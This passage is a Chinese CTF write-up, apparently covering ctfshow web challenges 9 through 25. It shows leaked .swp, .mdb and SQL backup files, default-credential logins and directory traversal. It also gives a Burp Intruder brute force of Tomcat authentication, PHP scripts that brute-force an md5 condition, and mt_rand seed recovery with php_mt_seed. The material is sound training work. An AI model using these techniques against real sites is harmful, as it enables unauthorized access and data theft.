意外退出会产生临时文件</p><p>需要注意的是如果你并没有对文件进行修改，而只是读取文件，是不会产生<code>.swp</code>文件的。</p></blockquote><p>题目说编辑网页，应该是网站首页，所以我们访问文件 <code>index.php.swp</code> 构造 URL </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://872954f8-ed97-4e44-96b3-b6333548bd28.challenge.ctf.show/index.php.swp</span><br></pre></td></tr></table></figure><p>下载文件，打开即可看到 flag</p><p>​      </p><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>题目提示 ”cookie“  所以我们查看本地存储的 cookie，在包的文件头也可以看到cookie值<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web10.png"></p><p>​       </p><p>进行一下 URL 解码，拿到 flag<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web10(1).png"></p><p>​       </p><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>题目提示 “域名其实也可以隐藏信息，比如 ctfshow.com 就隐藏了一条信息”  和域名有关的信息收集</p><p>我们对该域名进行DNS检测 ，可用阿里云查询链接：<a href="https://zijian.aliyun.com/%E6%88%96%E5%88%A9%E7%94%A8%E5%85%B6%E4%BB%96%E5%9C%A8%E7%BA%BF%E5%9F%9F%E5%90%8D">https://zijian.aliyun.com/或利用其他在线域名</a> DNS 解析查询<a href="http://www.jsons.cn/nslookup/">http://www.jsons.cn/nslookup/</a><br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web11.png"></p><p>​       </p><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p>题目提示“有时候网站上的公开信息，就是管理员常用密码”  可能与管理员有关</p><p>查看是否有路径可拿，访问 robots.txt，也可以扫描，直接URL输入敏感路径都可以 ,发现存在管理员的登录目录admin，访问，但需要账号密码。<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web12.png"></p><p>​       </p><p>根据提示，密码应该就在此网站公开，找到页脚，有一串数字，试试。<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web12(1).png"></p><p>​       </p><p>登录得到 flag<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web12(2).png"></p><p>​       </p><h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><p>题目提示 “技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码”</p><p>查找页面的可疑的文档，又是在页脚发现一个文件超链接<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web13.png"></p><p>​       </p><p>打开后发现是一个使用文档，有后台登录地址及身份<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web13(1).png"></p><p>​       </p><p>直接访问显示错误，我们将 your-domain ，就是我们的网址，改为我们题目的链接，构造 URL ，访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://855583d1-b17f-4687-9201-361a2c8dfedb.challenge.ctf.show/system1103/login.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web13(2).png"></p><p>​       </p><p>登陆成功后即可看到 flag<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web13(3).png"></p><p>​       </p><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><p>题目提示 “有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人”</p><p>所以我们直接访问 editor ，发现进入到了一个编辑界面 ，在编辑界面的这 3 个按钮中可以发现一个 文件空间<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web14.png"></p><p>点击文件空间可以发现可以进行 目录遍历<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web14(1).png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web14(2).png">        </p><p>寻找一番，发现 flag 在 var/www/html/nothinghere/fl000g.txt 下，于是构造 URL 访问 ,得到 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1bef8e6b-a152-4327-a454-c78e8bb52230.challenge.ctf.show/nothinghere/fl000g.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web14(3).png"></p><p>​       </p><h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><p>题目提示 “公开的信息比如邮箱，可能造成信息泄露，产生严重后果”  在页脚发现一个邮箱，暂时还不知道思路</p><p>在 URL 尝试访问 admin，发现可以<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web15.png"></p><p>​       </p><p>不知道账号密码，尝试 用户为 1 显示用户名错误，尝试 用户为 admin 显示密码错误，所以 admin账户存在</p><p>我们点击忘记密码，发现有密保 “我的所在地是哪个城市？”<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web15(1).png"></p><p>​       </p><p>这可把我整蒙了。这和邮箱有什么关系？？ 随后发觉这是个QQ邮箱，于是搜索该QQ号，发现城市名是 西安<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web15(2).png"></p><p>重置密码成功<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web15(3).png"></p><p>然后我们就可以开开心心登陆后台了，拿到 flag<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web15(4).png"></p><p>​       </p><h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><p>题目提示 “对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露” 所以跟探针有关</p><blockquote><p>资料显示：<br>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。是一个查看服务器信息的工具。<br>比如查看服务器支持什么，不支持什么，空间速度等等状况！</p></blockquote><p>本题与探针有关，尝试访问 <code>tz.php</code>  构造 URL </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://9ef070e8-9da7-4f0e-b4f6-9f49f0cf58f0.challenge.ctf.show/tz.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web16.png"></p><p>点击 PHPINFO<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web16(1).png"></p><p>在页面内寻找 flag<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web16(2).png"></p><p>​       </p><h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><p>题目提示 查找 ctfer.com 的真实 IP</p><p>使用 fofa 查找即可<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web17.png"></p><p>​       </p><h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><p>打开本关卡是一个小游戏，查看它的 JS 代码，当分数高大于100时会输出一串东西<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web18.png"></p><p>​       </p><p>将编码拿去Unicode解码一下<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web18(1).png"></p><p>​       </p><p>根据 “你赢了，去幺幺零点皮爱吃皮看看”提示，访问 <code>110.php</code>  构造 URL </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c942730e-776b-45cd-bcd4-573d4368b08e.challenge.ctf.show/110.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web18(2).png"></p><p>​        </p><h3 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h3><p>题目提示 “密钥什么的，就不要放在前端了”</p><p>查看源码发现一些信息，显示如果  post 请求满足</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</span><br></pre></td></tr></table></figure><p> 就能打印出 flag<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web19.png"></p><p>​       </p><p>于是构造 post 请求，拿到 flag<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web19(1).png"></p><p>​       </p><h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><p>题目提示“mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了”  跟mdb文件泄露有关</p><p>搜索资料过后发现： 直接查看 URL 路径添加 /db/db.mdb </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ad92e72a-2c61-4ae7-a0d1-e3b4761affbc.challenge.ctf.show/db/db.mdb</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web20.png"></p><p>​       </p><p>下载文件通过 txt 打开，搜索 flag<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/file/web20(1).png"></p><h3 id="web17（新）"><a href="#web17（新）" class="headerlink" title="web17（新）"></a>web17（新）</h3><p>题目提示sql备份文件可能泄密，扫描发现有 /backup.sql ，构造url访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://7e629e89-4feb-43e1-82eb-a274449bf606.challenge.ctf.show/backup.sql</span><br></pre></td></tr></table></figure><p>得到一个sql备份文件</p><p>​     </p><h2 id="爆破-21-28"><a href="#爆破-21-28" class="headerlink" title="爆破(21-28)"></a>爆破(21-28)</h2><h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><p>题目最开始提供了一个dic.zip，下载下来，里面是字典。页面显示账号密码登录，随便填写然后抓个包看看，这里是我们输入的账号密码，base64加密的，这是tomcat密码的格式，格式是”用户名”:”密码”，小知识。<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web21-0.png"></p><p>我们使用custom iterator(自定义迭代器)进行爆破，访问详细了解该模块<a href="https://www.cnblogs.com/007NBqaq/p/13220297.html">tomcat 认证爆破之custom iterator使用</a></p><p>​      </p><p>发送到intruder模块，我们要设置三个位置(position有三处)，第一个位置为admin，第二处为:，第三处为密码</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web21-1.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web21-2.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web21-3.png"></p><p>然后我们要对整个payload进行base64加密并去除url对这些符号的编码<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web21-4.png"></p><p>最后就是attack进行爆破了<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web21-5.png"></p><p>​      </p><h3 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h3><p>爆破子域名，访问这些域名，遗憾的是没有找到flag，失效了，填入题目的帮助过关<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web22-0.png"></p><p>​      </p><h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = md5(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">/   </span><br><span class="line"><span class="comment">//代码概括为传入token，经过md5加密后，第1位=第14位并且第14位=第17位，然后(第1位＋第14位＋第17位)÷第1位=第31位</span></span><br><span class="line"><span class="comment">#注意:计算机语言中计数是从第0位开始的，如：abcd的第0位是a</span></span><br></pre></td></tr></table></figure><p>使用脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author：mtrleed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$dict</span> = <span class="string">&quot;0123456789qwertyuiopasdfghjklzxcvbnm&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span>&lt; <span class="number">36</span>;<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">             <span class="variable">$token</span> = md5(<span class="variable">$dict</span>[<span class="variable">$i</span>]);</span><br><span class="line">             <span class="keyword">if</span>(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))</span><br><span class="line">             &#123;</span><br><span class="line">                <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))</span><br><span class="line">                 &#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;加密后的md5值为：&quot;</span>.<span class="variable">$token</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;解密后的值为：&quot;</span>.<span class="variable">$dict</span>[<span class="variable">$i</span>]);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span>(<span class="string">&quot;没有匹配&quot;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//token只有一位时匹配不到</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author：mtrleed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$dict</span> = <span class="string">&quot;0123456789qwertyuiopasdfghjklzxcvbnm&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span>&lt; <span class="number">36</span>;<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$k</span> = <span class="number">0</span>;<span class="variable">$k</span>&lt; <span class="number">36</span>;<span class="variable">$k</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">         <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">36</span>;<span class="variable">$j</span>++)</span><br><span class="line">        &#123;</span><br><span class="line">             <span class="variable">$token</span> = md5(<span class="variable">$dict</span>[<span class="variable">$i</span>].<span class="variable">$dict</span>[<span class="variable">$k</span>].<span class="variable">$dict</span>[<span class="variable">$j</span>]);</span><br><span class="line">             <span class="keyword">if</span>(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))</span><br><span class="line">             &#123;</span><br><span class="line">                <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))</span><br><span class="line">                 &#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;加密后的md5值为：&quot;</span>.<span class="variable">$token</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;解密后的值为：&quot;</span>.<span class="variable">$dict</span>[<span class="variable">$i</span>].<span class="variable">$dict</span>[<span class="variable">$k</span>].<span class="variable">$dict</span>[<span class="variable">$j</span>]);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//两位或三位字符串都可以找到符合的，在往上不再测试</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web23-0.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web23-1.png"></p><p>​      </p><h3 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:26:39</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 13:53:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$r</span>)===intval(mt_rand()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到这是一个生成伪随机数的，mt_srand(372619038)播种器的种子(seed)是定的，那么mt_rand()随机数生成器生成的数也是定了的，我们逆着看代码，如果$r的值等于生成的伪随机数，就会得到flag，所以我们把伪随机数打印出来赋值给$r不就好了嘛</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    mt_srand(<span class="number">372619038</span>);</span><br><span class="line">   <span class="variable">$R</span>=intval(mt_rand());</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$R</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web24-0.png"></p><p>构造url拿到flag<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web24-1.png"></p><p>​      </p><h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(hexdec(substr(md5(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = intval(<span class="variable">$r</span>)-intval(mt_rand());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一题没有给种子，那怎么办。我们令r=0，这时$rand = intval($r)-intval(mt_rand())就相当于$rand = 0-intval(mt_rand())，那么$rand = -mt_rand()=652617752<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web25-0.png"></p><p>mt_rand()的值出来了，我们要逆推出种子，使用工具php_mt_seed-master，工具地址：<a href="https://github.com/Al1ex/php_mt_seed">https://github.com/Al1ex/php_mt_seed</a></p><p>得到工具包之后我们在php_mt_seed-4.0下make然后回车，编译出php_mt_seed文件，然后就可以使用了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./php_mt_seed 需要逆推的随机数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web25-1.png">    </p><p>可以看到这里逆推出了4个种子，我们无法确定，需要一个一个试。</p><p>选择4个种子其一播种，生成随机数然后相加作为’token’值</p><p>意思是当rand等于0时，若token的值等于mt_rand()函数第二次和第三次产生的随机数之和时，打印出flag，先看看什么情况下rand=0呢？就是我们传入的r的值等于mt_rand()产生的第一个随机数时</p><p>我们使用最后一个种子开始<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web25-3.png"></p><p>所以开始构造<br> 第一个，构造?r=652617752，使得$rang=0，满足if((!$rand))，进入下一层if判断token的值<br> 第二个，构造cookie头里的token=1687873607<br><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web25-2.png"></p><p>​      </p><h3 id="web26"><a href="#web26" class="headerlink" 